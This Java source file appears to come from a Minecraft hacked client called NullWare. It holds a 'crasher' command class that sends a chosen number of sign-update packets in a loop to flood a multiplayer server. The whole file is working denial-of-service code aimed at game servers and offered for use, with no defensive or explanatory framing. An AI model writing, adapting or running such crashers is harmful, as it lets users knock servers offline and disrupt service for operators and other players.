package com.Vxrtrauter.NullWare.command.commands.crashers;

import com.Vxrtrauter.NullWare.command.commands.CrashHandler;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C12PacketUpdateSign;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.IChatComponent;

public class RandomPacketACrash implements CrashHandler {
    private final Minecraft mc = Minecraft.getMinecraft();

    @Override
    public void execute(int packets) {
        for (int i = 0; i < packets; i++) {
            mc.getNetHandler().getNetworkManager().sendPacket(new C12PacketUpdateSign(mc.thePlayer.getPosition(),
                    new IChatComponent[]{
                            new ChatComponentText("bella"),
                            new ChatComponentText("bella"),
                            new ChatComponentText("bella"),
                            new ChatComponentText("bella")
                    }));
        }
    }
}